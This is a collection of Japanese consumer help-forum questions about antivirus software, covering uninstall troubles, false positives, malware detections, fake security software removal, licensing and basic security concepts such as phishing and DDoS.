以前はウイルスバスターを使っており、セキュリティソフトの更新を期に、ＥＳＥＴの体験版、カスペルスキーの体験版の順番に入れてみました。 困っているのがインターネットをしている時に時々画像が消えてしまいます。 ページを取り込みが完了するまでは、画像は有るのですが完了したら消えてしまいます。 カスペルスキーの設定を色々確認してみましたが、分かりませんでした。 次回のセキュリティソフトの候補にしているので、何とか解決したいと思いますので、お分かりになられる方、どうかご指導をお願いします。
お世話になります。 本日海外のサイトをサーフィンしていたら、強制的にいきなり何かをDLする画面になりました。 急いで画面を閉じたのですが、その後CPU使用率が70～100％を行ったり来たりするようになり、ESETのアンチウイルスソフトで調べたところ、1つの脅威が見つかりました。 そのままの状態では「駆除できません」と出ましたので、NODのレスキューディスクを利用し、削除を試みましたが、 今度は「ウイルススキャナの初期化に失敗しました。ESET SysRescueのほとんどの機能は適切に機能しません」と表示され、検知そのものができませんでした。 脅威として表示されているのは dwm.exe(720)-Win32/Gataka.Bの亜種　トロイの木馬　というものです。 正直アンチウイルスソフトを過信しすぎていました。反省しております。 出来れば再インストールは避けたいのですが、何か方法がありましたらご教授いただけないでしょうか。 よろしくお願いいたします。 （私のPCの環境） OS:Windows7　Professional バージョン6.1（ビルド7601：Service Pack1） アンチウイルスソフト：ESET Smart Security 4 バージョン4.2.52.0
USBメモリーを普段windows7のパソコンで使用しています。 その時には、Q8OT.EXEが表示されていないのですが、先日、友人のマッキントッシュのパソコンで使用した時にQ8OT.EXEが表示されていました。 何かな？　とは思ったんですが、その場で用事が済むとすぐに帰ったので、このことは忘れていました。 今日、久しぶりにUSBメモリーを自宅のwindows7のパソコンで使用し、何気なくこのことを思い出し、ウイルスバスターで検索してみると、Q8OT.EXEを削除しました、と出ました。 それで、Q8OT.EXEはウイルスだと気づかされました。 これはパスワードなどを破られる危険なウイルスだと知りました。 私のパソコン（というか、USBメモリー）からは削除しましたが、友人のマッキントッシュには感染しているのでしょうか？ ウイルス検索してパソコンが安全か調べてくれといったほうがいいのでしょうか？ しかし、私のwindows7のパソコンからは何も出ませんでした。USBメモリからは出ました。 パソコンには感染しないのでしょうか？ マッキントッシュには、USBメモリを3分ほど差し込んだだけでは感染しないのでしょうか？ もし、感染していたら、どのような被害が出るのでしょうか？ マッキントッシュとUSBメモリからのウイルス感染について詳しくないので、詳しく教えてもらいたいです。マッキントッシュにもウイルススキャンなどあるのでしょうか？ おねがいします。
次のウイルスバスターやノートン３６０はいつごろ出るのでしょうか？
こんにちは。 パソコンを2台もっています。 それぞれに買った時についている無料のセキュリティソフトが違う会社のものです。 どちらとも今、期限が切れたので、新しいソフトを買うようにメッセージが来ます。 違う2種類のソフトが入っている場合、それぞれ別のものを使わなきゃいけないのでしょうか? 今、ソフトを買うと2台インストールできるものもありますよね。 もとから違うソフトが入っている場合、元から入っているものと、違うソフトを入れても大丈夫なんでしょうか? 後々面倒なメッセージ゛が出てきたりしないんでしょうか? 教えてください。よろしくお願いします。
間違えて、aviraのtoolbarを削除してしまい、再度aira本体をDLしても正常にできませんでした。現在中途半端にaviraが残っているためかと思い、コントロールパネルからの「追加と削除」で既存のものを削除しようとしたところ、それもうまくいきませんでした。「手動でアンインストールしてください」と表示されますが、方法が分かりません。現在、aviraのマークは傘が閉じてしまっている状態で、修復しようにもtoolbarを再インストールするように指示が出、それをしようと、「追加と削除」で「変更」を試しても、なぜか「手動でアンインストール・・・」と表示され、ループにはまっています。正常に利用するにはどうすれば良いのでしょうか。 現在、パソコンが保護されていない状態で、とても不安です。詳しい方、ご教示お願いします。
パソコンを使用中に画面が砂嵐のような状態になり操作ができなくなります。 原因と対処方法がありましたら教えて下さい。 デスクトップパソコンを使用しています。 インターネット上の文書ファイルを開いたり、 リアルプレーヤーにダウンロードした動画をソフトを立ち上げてみようとすると 画面が砂嵐のような状態になり操作不能になります。 このような操作をすると、毎回必ずなるのではありません。 パソコンのボタンでの強制終了も困難で、 コンセントを抜いて電源を切った後、再び立ち上げて利用しています。 ウイルスソフトとして無料のアバストをダウンローとしており、 その機能でウイルスチェックもしましたが特にウイルスは発見されませんでした。 この1ヶ月くらいで突然起こり始めたのですが原因は何が考えられるのでしょうか。 また、対処方法がありましたら是非教えていただけるとありがたいです。
現在、5年前に買ったDell PCにカスペルスキーを入れているのですが、 昨日、ついにカスペルスキーのウイルス更新有効期限が到来してしまいました。 で、ここでPCの買い替えを検討しており、なおかつカスペルスキーは やや動作が重い気がするので、次はノートンを試してみようと思っています。 そのため次のPCの買い替えまでセキュリティソフトをどうするか迷っているのですが、 このまま更新しないカスペルスキーを使い続けるのと 無料のセキュリティソフトを使うのとでは、どちらがマシでしょうか？ 買い替えまでは、2～3カ月くらいを想定しております。よろしくお願いします。
よろしくお願いします。 ウイルス対策として、マイクロソフトのMicrosoft Security Essentials。 不正侵入対策として、ウインドウズ標準搭載のWindowsファイアウォールを有効。 で必要十分でしょうか？
見つからないプログラムのアンインストール方法を教えてください。 ダウンロード版のウイルスセキュリティＺＥＲＯを購入したのですが、以下の同種製品が入っています。〔アンインストール〕ボタンを押して同種製品を削除してから、本製品をインストールしてください。 と表示されたのですが、ボタンが出ないため削除できません。〔イーストセキュリティコンポーネント〕 コンピューター内のＥＳＥＴのフォルダを削除したのですが、やはり出来ません。
Win7(64bit)を使用。 今現在はAvastのFree版を使っていますが、友人からPanda cloud freeがテストの結果、avastやAvg, Aviraより検出率が高いと聞きました。Pandaは最近日本語化されたようで、いろいろ検索してもあまり評価がわかりません。Pandaを使用されている方、是非使用感を教えてください。
AVG Anti-Virus Free Edition2012について OS：Windows XP Pro SP3を使用しています。 ハードディスク交換をして再セットアップを行い、使用しているソフト類をいれてAVGをインストールしたのですが、AVGで常駐シールドアラート脅威検出で一番良く使うソフトのsetupファイルがLuhe.Fiha.A検出で隔離されてしまいます。。。。 高度な設定-ウイルス対策-常駐シールド-例外の設定 高度な設定-Identity Protection-許可リスト設定 高度な設定-不審なプログラム例外設定 スキャンオプション-特定のファイルフォルダやスケジュールスキャンからもスキャンしてほしくないフォルダを選択して設定してみましたが、スキャンがかかると必ず、脅威として検知され隔離室に入ってしまいます。。。。 他に何か設定する方法ってあるのでしょうか？ ソフトメーカーに確認したら、ウイルスソフト側での設定になりますと言われてしまい。。。。
ウィルスバスターは、他のウィルスソフトに比べ、何故高い？
http://virusbuster.jp/onlinescan/ ここでオンラインスキャンをしました。 検索結果に「トロイの木馬」が見つかったのですが、スキャンのみで駆除はしてくれませんでした。 そのあとでてきた画面からウイルスバスター2012体験版をインストールし、早速ウイルスを探したところ、「脅威0件」と出ました。 スキャンしたあとのファイル名をプログラムとファイルの検索から検索してもヒットせず、どうしたらいいのかと困っています。 これは、どうしたら検出、駆除されるんでしょうか？また、ウイルスアンチソフトが削除せずとも、自分でそのファイルを見つけて完全に削除してしまえば、ウイルスは消滅してくれるんでしょうか？ そして、もしウイルスを駆除できなければ、初期化するしかないんでしょうか？ 実は、3週間ほど前に初期化しているんです。動作が重くて、メーカーに出したら感染していると言われました。その後、自分で初期化しました。 正直、いろんな設定やら元通りにするのが面倒なので、できるだけ初期化なんてしたくありません。 どうすればいいでしょうか？
現在、エッセンシャルとゆうセキュリティを使っていますが、オンラインゲーム中頻繁に回線切断されるようになりました。以前は違うソフト使ってたんですが、変えてからよく落ちるようになってしまいました。 PCに詳しくないのでどなたか教えていただけないでしょうか？ どうか早めの回答をよろしくお願いします(´；ω；｀)
このカテをみていると不安になることがあります。 現在はeset smart securityを使っていて後はブラウザの拡張機能として mcafee siteadvisor wot bitdefender trafficlight等を組み合わせて出来るだけ危険なサイトを 開かないようにしているつもりですが、 それでもバイパスアンチウィルスやバイパスファイアーウォールやドライブバイダウンロード 被害にあってしまう可能性は低くないでしょうか？
Kingsoft AntiVirus　防御エラーの対応方法について、キングソフトへお問い合わせ済みですが、お力お貸しいただければと思います。 昨日、キングソフトセキュリティから他社のセキュリティソフトへシフトしたところ、少し動作が遅い為、原因を調べましたら、動作重さの原因であろうキングソフトの.dllの残骸が残っていた為、全て削除しました。削除したフォルダの場所は、C:\Program Files\Kingsoftとなります。 その後、再起動をしたところ、残念ながら重たさは変わらずに、タスク右下に判断がつきにくかったのですが、全角一文字程度の空白が空いていたのでカーソルを置いたところ、Kingsoft AntiVirus　防御エラーと言う文面が表示されました。 修復、アップデート、終了を選択できるようで、全て試しましたが、修復、アップデートは無反応及びフリーズ。終了を押すと、少し動作が元に戻った感覚となりました。 つきましては、この現象を解消された方、この方面に優れた知識をお持ちの方がいらっしゃいましたら、お力をお貸し頂けますと幸いでございます。どうぞ宜しくお願い致します。
returnil system safe free 2011を使った場合レジストリクリーナーでレジストリの内容を変更した場合でも再起動すれば元に戻るのでしょうか？ お分かりの方がいらっしゃいましたら回答の程宜しくお願いします。
無料ウイルスソフトを探しています。以前にＡＶＧを入れたのですが、ウイルスなのかわからないのですが、ネットをする際に毎回中国のサイトがトップページになるウイルス（？）ごとダウンロードされやめました。avastもいれたのですが、毎日更新されるのでパソコンが非常に重くなると思ってやめました。そんなもんなんですかね？それともフリーソフトをいれるぐらいなら購入したままのほうがよいのですか？よろしくお願いします。
自分はウィルスバスター２０１２を入れてますが このあいた、パソコンにインストールしているゲームのファイルの一部が 「トロイの木馬」に感染されています。と表示されました。 ゲームのファイルでしたので、イントール元のゲームのディスクファイル （ＤＶＤ）を入れ、その中にある同名ファイルを検索したところ、 同じトロイの木馬に感染されていますと表示されました。 ウィルスってDVDにも感染するのですか？ それともウィルスバスターの誤爆でしょうか？
無料ウイルスソフトavastをダウンロードしました。ネットワークに接続されましたと記載されていたのですが、これは暗証番号とか盗み取られないのでしょうか？一時ネットができなく、ＡＤＳＬの本体を初期化してつながりました。で、ややこしくなりそうなのでこのソフトをアンインストールしようと思ったらできません。 ウイルスソフトなど無知のレベルなのでよろしくお願いします。
アクセス中に変な画面が出ます うまく添付できてるといいのですが・・・ サイトにアクセスすると変な画面が出ることがあります 緑、黄色、オレンジのチェック柄のようなもので、 全画面色のみの表示です。文字などは表示されておりません。 アダルトサイトではなく、個人のブログであったり まとめサイトでこのようなことがありました。 次のページへ飛ぶ時に出たり、ブックマークにいれてるサイトに 直接入っても出ることがあります。この画面で止まるわけではなく すぐ切り替わるのですが、ちょくちょく出るようになってきたので 気になって質問させて頂きました。 使っているPCはdynabookで、6月に購入したばかりの新品です OSはWindows 7で、ウイルスソフトはESET Smart Securityです。 もう一台デスクトップを所有していますが、 そちらではこのような画面が出たことはありません。 なぜこのような画面が出るのか教えて下さい。
お試しでJUSTインターネットセキュリティをインストールして試したのですが、 インターネットのファイルアクセスが遅すぎて使い物になりませんでした。 完全に削除したいのです。 通常アンインストールしたのですが、自動UpdateのServiceが残っていたので REGEDITから消しました、 ところが、HKEY_USERS\S-1-5-19\Software\Justsystem\Common\LMAという レジストリがどうしても消せません。 こんなゴミを残して消せないトンデモソフトがどうして存在するのでしょうか？ 消し方をご教授ください。
ウィルスセキュリティＺＥＲＯって安いけどどうですか？
数日前から、パソコンの動きが急に遅くなり始め、カーソルの動きもスムーズに進みません。 メールの送受信も、非常に時間がかかるようになりました。 ウィルス対策のソフトが入っていますが、それには全く触ってはいません。 なのに、調べてみると、そのウィルス対策ソフトのＣＰＵは９０パーセント台を推移しています。 これが、動きの遅くなる原因かな・・と素人は考えてしまいます。 ウィルス対策の設定は、一応高中低の高にしてあるのですが、これは、最初からで、数日前から何かをしたという経緯はありません。 新しい何かを導入したということもありません。 ちなみにウィルスは、処理済に５個見つかりました。 ＩＴには詳しくないです。 Ｗｉｎｄｏｗｓ７を使い、ＥＳＥＴというところとウィルス対策の契約をしています。 ＥＳＥＴの中で、質問解決が出来ればと思ったのですが、シリアルナンバーなど、細かい登録が必要なので、素人はあきらめて、こちらで質問させていただきました。 ウィルス対策のソフトとＣＰＵの関係などをどなたかわかりやすい言葉でお教え願えないでしょうか。
質問です。 今このような状況です。 1年前にiPhone4を購入しました。 パソコンをお正月明けに購入しました。（Windows7） すぐにインターネットを繋ぐ予定でしたが、業者さんの都合でインターネットを繋げない状態が続いています。（連絡待ちで、いつになるか分からないそうです） パソコンは、iPhoneとUSBコードを繋いで、カメラロールの写真を取り込んだり、 友人から借りたCDやUSBのデータを読み込んだりしています。 パソコンに元々入っていた、ノートンウイルスソフトは、 有効期限が切れてしまいました。 この先も、たまにiPhoneを繋いで写真を移したいのですが、 ウイルスソフトが入っていないパソコンとiPhoneを繋ぐことは危険でしょうか。 iPhoneでは、インターネットの閲覧はかなりしています。 メルマガなどもたくさん受信しています。 ただ、iPhoneがウイルスに感染しているかがわかりません。 パソコンには、仕事のデータや、個人情報も入っているため、 例えばiPhone経由で情報が 漏れたりしないか不安です。 この場合は、 市販のウイルスソフトを購入し、パソコンにインストールしたほうがよいのでしょうか。 それとも、iPhoneの ウイルス対策はあるのでしょうか。 また、iPhoneは1年、 パソコンは半年以上、 （購入してから一度も） バージョンアップをしていない 状態です。 これは危険な状態でしょうか？
Live Security Platinumの駆除につてサイトを確認しながら実施ししたのですが、インターネットが繋がらないのとウイルスソフトが起動しません。windows defenderでは正常に起動していますと表示されます。 まだLive Security Platinumが残っているせいでしょうか？対処方法を教えてください。よろしくお願いします。
パソコンにあまり詳しくないのに会社の情報管理部門の担当になってしまいました。 社員向けに標的型メールについての教養資料を作成しているのですが、その中に出てくる 「フィッシング詐欺」「DDos攻撃」「踏み台」「exeファイルは何故危険か」についての 解説をしなければなりません。 色々なサイトや本を読んで私なりに理解をしたつもりですが、イマイチ自信が持てないので、 詳しい方にお読みいただき、間違いがあれば指摘していただきたいのです。 よろしくお願いします。 特に４番の「exeファイルは何故危険か」が自信がありません。 １　「フィッシング詐欺について」 　架空のメールやサイトを使って、パスワードやクレジットカード番号などの個人情報を 盗み出す詐欺です。 　釣りという意味の「fishing」から来た言葉ですが、「洗練された」「改ざんする」という意味の「sophisticate」という言葉と合わせて「phising」というスペルになっています。 　まず詐欺師は銀行やクレジットカード会社からのメールを装い 「システムのセキュリティを強化したため、こちらのサイトから再度ユーザ登録をしてください。」 といったメールを送ってきます。 　指示されたサイトは詐欺した作った偽ページであり、ここで書き込んだクレジットカード番号やパスワードなどの情報は全て詐欺師の手に渡り、悪用されてしまうのです。 ２「DDos攻撃について」 　Dosは「Denial of Service」の略です。「Denial」は「拒否」という意味で、 「サービス拒否攻撃」とも呼ばれます。 サーバなどのネットワークを構成する機器に対して、大量のデータを送り付け、 ウェブサイトやメールサービスなどを利用できなくする攻撃のことをいいます。 　イメージとしては、特定の電話番号に無言電話やいたずら電話を大量に発信して、 他の電話が繋がらない状態にすると考えると理解しやすいと思います。 　Dos攻撃を複数のコンピュータで行うことをDDos攻撃といいます。 　先頭のDは「Distributed」の略で、「分散、配布」を意味します。 　DDos攻撃の場合は、悪意を持った攻撃者が、メールなどを用いて一般家庭や 企業のコンピュータにウイルスを仕込み、コンピュータの所有者の知らないうちに Dos攻撃の片棒を担ぐように操作します。 　勝手に無言電話を繰り返しかけるように改造してしまうと考えると理解しやすいと思います。 ３「踏み台について」 　ＤＤｏｓ攻撃などの不正行為の中継点として利用されるコンピュータを踏み台といいます。 　踏み台として利用されたコンピュータの所有者は、不正アクセスの痕跡から犯人であることを 疑われたり、結果として犯罪行為の幇助を行ったとみなされたり、ウイルスの不正侵入を 許してしまうセキュリティの不備や管理の不備を問われたりする恐れがあります。 ４「exeファイルはなぜ危険か」 　exeファイルとは「実行ファイル」と呼ばれているもので、何かのプログラムが収められている ファイルです。 　クリックするとパソコンに必要な情報を書き込んだり、設定を変更するプログラムが自動的に 実行されるようになっています。 　例えばクリックするとファイルの表示モードの設定を変更して、ウイルスファイルを見つけない ようにしたり、マウスとキーボードの操作を記録し、exeファイルの送信者に定期的に送信する といった命令が実行されるものもあります。 　これにより送信者は、ログインIDやパスワードを取得することができるといった具合です。
youtube録画ソフトArea61を使おうとする、ファイアウォールZONEALARMに次のような警告が 出ます。 「The cURL executable はインターネットまたはローカル ネットワークへ接続しようとしています 。」 質問ですが、The cURL executableとは何でしょうか？　また、接続を許可して安全なのでしょうか？ 以前には、youtube録画ソフトArea61を使用しても、このような警告は出ませんでしたが、最新版では出るようになりました。また、同ソフトでニコ動も録画できますが、ニコ動録画の時には上記の警告は出ません。 ネットで調べてみましたが、わかりませんでした。 よろしくお願いします。 参考、　Area61 ビデオダウンローダー　http://www.area61.net/
ノートン360のバージョン6を使っています。 PCチューンで、注意が出ます。 今すぐ解決、のボタンを押すと、チューンナップのウィンドウが出ます。 そこでディスクの最適化が実施されるのですが、エラーが発生します。 詳細の表示のリンクを押すと、詳細ウィンドウが出ます。 処理：ディスクの最適化 項目 システム予約ドライブ：エラー　- 完了していません。 と出ます。 どうすれば、これが出ないように対策できるでしょうか？
　　ＰＣでアダルトサイト『えろぐちゃんねる』を見ていて、気に入った動画をクリックして再生すると、翌日に必ず携帯電話に変なメールが来ます。 　　ウイルスバスターで携帯のメールアドレスを保護しているのですが、駄目なようです。 　ウイルスバスターに代わる良いセキュリティーをご存じの方がいらっしゃいましたら、教えていただけませんでしょうか。
Live Security Platinumの駆除につて質問です。 いろいろなサイトを見ながら進めていったのですが、レジストリ（RunOnce）のところで「既定」しか出てきません。この場合の対処方法を教えてください。よろしくお願いします。
質問です。 windowsXPのプロセスにCU17A.EXEというプロセスがありますが自分でネットで調べても見つかりませんでした。 ウィルスみたいなものでしょうか？ どなたかご存知の方いらっしゃいますか？
いままで複数のパソコンに使えるアンチウィルスソフトを購入したことがありません。 そこで質問なのですが、ノートンインターネットセキュリティの2年間3台のパソコンに使えるソフトがあります。 これは1台のパソコンに2年ごとに更新して6年間使うということはできるのでしょうか？ それとも1台だろうが3台だろうが初期の登録時から2年間しか使えないのでしょうか？
ハッキングというのは 「PCを操作したりPCのログイン情報をそのまま取得できてしまいます。トロイの木馬などもそういうことができます」 との書き込みを見ました。これって当然実際に知っているということになるんですよね？ で、これに続いて 「何とかの背中になんとかを乗せてえ～♪」みたいなｗ解説があったんですが、私はよく理解できませんでした。なんか書いてる人がコケちゃってるように感じてしまったんですが。理解できた人居られましたら説明いただけると助かります。 どうぞ宜しくお願い致します。
Norton、ウイルスバスター、McAfee、GDATA、ESETなどは３台分での価格が設定されています。Avira、Pandaなど一部に１台分のもありますが、その他の殆どが３台分の価格です。私はＰＣは一台ですし、家族も私以外はＰＣを持っていません。携帯も普通の携帯電話です。私のような者のために、価格を低くしてくれないのでしょうか？昔は１台分の価格が殆どだったのですが、なぜ３台分になったのでしょう。メーカーの方がこれを見たら教えてください。もちろん他の方でも教えてください。
スーパーセキュリティーzeroの中身はbitdefender internet securityだということですが 全く同じものなのでしょうか？もし全く同じなら更新料のかからないスーパーセキュリティーzeroの方が お得？ということになると思いますが、バージョンが古かったりするのでしょうか？ お分かりの方がいらっしゃいましたら宜しくお願いします。
セキュリティーソフトにMicrosoft Security Essentialsを使ったらメモリをたくさん使ってパソコンが重くなりました。 なのでMicrosoft Security Essentialsを軽くする設定を教えてください。 (windows7 32bit メモリ2GB)
フリーのセキュリティソフトでKingSoft　からでてます「永久不滅インターネットセキュリティ」このソフトをお使いの方、何か不具合はありませんか？ 特徴が４あり、「最速・最小・最軽量クラウドセキュリティ」「世界最高クラスのパフォーマンス」「電話・メールで完全サポート体制」」など　とあります。また、国内唯一の無料総合セキュリティ　だそうです。 お使いの方教えてください。
質問させていただきます。 オーダメイド商品のネットショップをしているのですが、受注後、出来上がりの商品画像をお客様にメールで送りイメージ通りか確認してもらうサービスをしようと考えています。(イメージ違いによる返品を減らす為) この場合、当店から送信したメールによりお客様のパソコンやスマートフォンがウイルスに感染する危険はありますか？ 送信するパソコンにはウイルスソフト(ノートン)が入っていますが、受信時のブロックはできても送信するメールには機能しないのではと考えています。これは私の認識違いでしょうか？ 当店のせいでお客様のパソコンが感染する事をなんとか防ぎたいのですが、良い方法はありますか？お客様が自己防衛するしかないのでしょうか？ アドバイスよろしくお願いいたします。
　ソースネクストのウイルスセキュリティについて質問です。 　6月くらいにウイルスセキュリティのソフトが新しくなって、通知が出たままに新しいソフトをインストールし、エントリー画面でメールアドレスやシリアルナンバーを入力するところまでできました。 　その後「送信」を押すと、「エントリーに失敗しました。エントリー中にクリティカルな問題が発生しました。送信エラー」と出て、先に進むことができません。 　同じような現象が続くので、メーカーに問い合わせて、対策をやってみたのですが、全く解決できず、途方にくれています。 　同じような現象を経験された方、対策のわかる方がいらしたら、教えてください。よろしくお願いします。ちなみにプロバイダはケーブルテレビで、ブラウザーはgoogleとinternetexplorerです。
新しいＰＣを買おうと思っています。 現在使用しているＰＣはネット接続せずに年賀状作成に利用し、インターネットやメールなどは新しいＰＣで行おうと思っております。 ネット接続しないＰＣはウイルスソフトは必要なのでしょうか？もし必要なら無料のウイルスソフトなどは安心なのでしょうか？
公衆WiFiスポットはハッキングしやすい、されやすいという書き込みを見ました。 何故にそう言えるのか説明頂けるとありがたいです。 どうぞ宜しくお願いします。
ノートパソコン・iphone・ipadで、街中にあるwifiスポットやホテルのwifiスポットを使ってサイトにログインする場合 そのサイトでhttpsの設定がされていれば、IDやパスワードを入力しても安全でしょうか？
セキュリティソフトを見ていると、「更新2年」だとか書いてあるものがありますが、 あれはダウンロードした体験版にでも使えるのでしょうか？ 回答お願いします。
returnilについていくつか質問があります 1 returnilは現在バージョン2011まで出ていると思いますが、日本の公式サイトでは バージョン2010までしか出ていません、2010はセキュリティー上問題はありませんか？ 2 ttp://www.returnilvirtualsystem.com/download/prod/rss-2011.exe 上記のリンクからメールアドレスを入力しなくてもreturnil2011を直接ダウンロード できるようですが、こちらのリンクからダウンロードしても問題はありませんか？ また何故アメリカの公式サイトにはないreturnil2011の直接ダウンロードが公開されているんですか？ 3 returnilは暴露系のウイルスに弱いようですが、例えばパソコン購入時の状態でバックアップを とっておき、returnilを有効にした後つねにバックアップから復元するようにしておけば 暴露ウイルスに感染したとしても被害は最小限にとどめられませんか？ またreturnilを有効にした状態でダウンロードしたファイルを、オフラインでしか使わない別の パソコンに保存して使うようにすればウイルス対策は十分といえますか？ よろしくお願いします
ウイルスソフトにキャノンのESET Smart Securityを使用しています。 更新が近づいてきたので、無料のmicrosoft security essentials に変えようと思っています。 esetを使用していて、度々 「ポートスキャニング攻撃が検出されました」 というメッセージが表示されていましたが、 microsoft security essentialsに変更した場合、 この攻撃は検出できるのでしょうか。
先日妻のパソコンを見てて気が付いたのですが、ウイルス対策ソフトにＫＩＮＧＳＯＦＴの無料版を使っていますが、表示が全て中国語になっていました。 気持ちが悪いのでアンインストールしたら最後に再インストールの為に型枠（そのような表示だったと思います？）を残しておきますとコメントがありました。 それで再起動して下さいとのコメントがあったので再起動しようとするとブルー画面が出てその後通常起動やらセーフティなどのコメントが出てＦ８を連打して修正で半月前まで遡り回復しました。 その後アンチウイルスのソフトの要求がありＡＵＧ？のフリーソフトをインストールしようとしたら上記と同じブルー画面が出て又Ｆ８連打。 同じ事を数回繰り返し途中ＫＩＮＧＳＯＦＴも再インストールしてみましたが、又Ｆ８連打で未だにウイルス対策ソフトがインストールできません。 ＯＳはｗｉｎ７です。 何か良い方法がありますでしょうか？ よろしくお願いいたします。
現在スマートパスに加入しているのですが 以前、使用していたスマホにスマートパスで提供してるウイルスバスターを インストールした所、設定項目等が少ない気がしますが、Trendmicroが提供してる 製品と、KDDIがスマートパスで提供してる同製品の機能差って、どの程度 あるのか？ご存じの方おられましたらお教え願います。
セュキュリティーソフトのせいですか？ ＨＰを見ていて、おもしろそうなＨＰにジャンプしようとして、そこにカーソルをあてると、右手が現われます。そこをクリックすると、時にオレンジ色の星のマークで中に「！」マークが入ったものが登場します。これをクリックすると、音がしてできません。危険なＨＰとして行かないようにしているのですか。どう考えても安全な所にも行けず困っています。 　これはだれがしているのですか。一時的に解除できますか。 　しかし、不思議なのは、右に左に数ミリ動かすと、クリックできて新しいＨＰにジャンプできる時もあるのです。こんな精度なのでしょうか。教えて下さい。なお、ＯＳは７でウイルスバスターを入れています。
知人の手伝いでホームぺージに記事を投稿する作業を行っているのですが、その作業をほぼ毎日行っていたのですが、一週間くらい期間があいた後、記事を新規作成・編集等を行うページにログインするときに「トロイの木馬をブロックしました」というメッセージが出るようになりました。 そのページが感染しているのかと思い、その知人に聞いてみたところ、その方は普通にログインして見れるとのことでした。 自分のパソコンでウィルス検査をしたところ、トロイの木馬に感染していたので、それを削除したら、ログインが出来て作業が行えるようになりました。 ところが、また一週間くらい空いたあと、またログインをする時、「トロイの木馬をブロックしました」というメッセージが出てログインが出来なくなりました。 自分のパソコンをウィルス検査したところ、何もウィルスは検出されませんでした。 記事がアップされたホームページは問題なく見れるのですが、記事を新規投稿・編集する画面はどうしても見れず、以下のエラーメッセージが出ます。 （ちなみに、私は、AVASTという無料のアンチウィルスソフトを使っています） 危ないところでしたがご安心ください。アバスト! がクラッシュから保護しました。 過去においてウイルスとスパイウェアの拡散方法はメールが主でしたが、現在はマルウェアの80%がインターネット経由で広がっています。実際最新のアバスト! ウイルス研究所の調査によるとマルウェアの 99%が通常のウェブサイト経由のもので、たった1%が怪しいまたは『いかがわしい』サイトからでした。 Infection Details URL:(オブジェクト） Process: file://C:\Program Files\Internet Explorer\iexplore.exe Infection:(感染） js:Redirector-YG [Trj] 私のPCがいけないのかと思い、他のPCで試したところ、AVASTの入っているほかのPCでも同じエラーになり、「セキリュティ０」という有料のセキュリティソフトを使用しているPCでは、「ウィルスが検出されました。ウィルスを削除されました」と出て、ログインが出来ません。 ですが、知人のPCでは有料のウィルスバスターを入れているらしいのですが、警告も出ずに、ページも開けるそうです。 それに、ウィルスには感染していないはずだといわれました。 適合性が合わなかったり、ブラウザが古いとトロイの木馬と勘違いしてそのような警告が出る場合があるといわれたので、googlechlomeをダウンロードしてそこからログインを試しましたが、 a.. このウェブページを後で読み込んでください。 b.. インターネット接続を確認し、使用しているネットワーク デバイス（ルーター、モデムなど）を再起動してください。 c.. ファイアウォールまたはウイルス対策ソフトウェアの設定で、 Google Chrome を許可されたプログラムとして追加してください。 許可されたプログラムとして既に追加されている場合は、リストからいったん削除してから再度追加してください。 d.. プロキシ サーバーを使用している場合は、プロキシの設定を確認するか、ネットワーク管理者にプロキシ サーバーが正常に動作しているかどうかを確認してください。プロ キシ サーバーを使用していない場合は、次のプロキシ設定を編集してください: ツール メニューの [設定]、[詳細設定を表示...]、[プロキシ設定の変更...]、[LAN の設定] を順にクリックし、[LAN にプロキシ サーバーを使用する] チェックボックスをオフにします。 エラー 101 (net::ERR_CONNECTION_RESET): 接続がリセットされました。 と出ました。 何が悪いのか、どうしたらいいのか、分からずとても困っています。 ウィルスではないのなら、ぺージを開きたいのですが、ブロックされるので、開けません。 長文で申し訳ないのですが、ウィルスやパソコンに詳しい方、解決方法を教えていただけますと幸いです。 よろしくお願い致します。
パソコンを修理に出したのですが、ウイルスに感染したらしく、初期化しないとならないらしく、1万5千円ほどかかるらしいです。 自分で初期化　というものは、可能なんでしょうか？パソコンの知識は、ぶっちゃけ構造等に関しては皆無です。 一朝一夕でそれは不可能でしょうか？壊すのが関の山でしょうかね…
JMP3up(トップに最近の曲のジャケットがいっぱい貼っているサイト)と言うサイトで音楽をダウンロードしようとしているのですが、このサイトは危険なのでしょうか？ ウィルスやスパイウェアは入りますか？ あまりいい気配はしないのですがたくさん曲があるのですこし興味があります
お世話になります。 使用期限が切れたので先ほどウィルスバスターを アンインストールし、新しいセキュリティソフトを入れようと 思っています。 残骸が残っているとトラブルが起きやすいと聞いたので 一応きちんと削除できているか確認したいのですが、 どのように確認すれば良いのでしょうか？ コントロールパネルからアンインストールしもう一度 プログラムと機能を見たところウィルスバスターは消えています。 分かりにくい文章ですみません。 よろしくお願いいたします。
ノートンインターンネットセキュリティについてです 有効期限が切れると、当然更新が出来なくなって新しいウィルスなどの危険に 対応できなくりますよね？ でも、全く働かなくなってしまうものなのでしょか？ 古いセキュリティ情報のまま働いてくれるのか，完全に働かなくなってしまうのか… どちらなのでしょう??
無料の、更新要らずで、半永久使用でき、軽いセキュリティソフトをご存知でしたら、いくつか紹介してほしいです。 ウイルススキャン機能があると安心です。 ご存知の方よろしくお願いします。
「もう私のパソコンは安全なの？」 という質問がありまして、対する回答の一部に 「長い線で繋いでるという事はNTTモデムから直にLANに繋いでるですね、これをPPPoE接続と言いましてルーターと同じです。現在の状態は安全です」 という回答を見かけました。 私には理解できませんでした。 まず、NTTモデムがどっから出てくるのかということ、で、このモデムからLANに直に繋ぐことがPPPoEなんでしょうか。しかもるルータと同じだということで。 ちなみに、私はリンクレイヤのコネクションシーケンス、ネゴシエーションなどのフローも承知しています。 わかる方居ましたら解説頂けると助かります。 宜しくお願いいたします。
対策ソフトの試用版での使用期限について 「期限情報は、あちこちに起動用の重要ファイルと紐付けされて隠されていますので、それらを削除するとPCの不具合を招きます。 たいていはPCが起動しなくなります」 との書き込みを見ました。 これは文面通りで間違いないのですよね？ 要するにユーザーがその期限情報を削除しようとしてPCが起動しなくなってもその行為を行ったユーザーの責任であるということ？ 期限以後の使用をできなくするだけでいいので、PC自体を起動させないようにすることまで必要なんでしょうか？私は腑に落ちません。 人によっては頭に来て器物損壊で対策ソフトメーカーを訴えるような事態も考えられなくはないと思いますが。 間違いなくそういう仕様になっているということで間違いはないのですね？ 説明をぜひお願い致します。
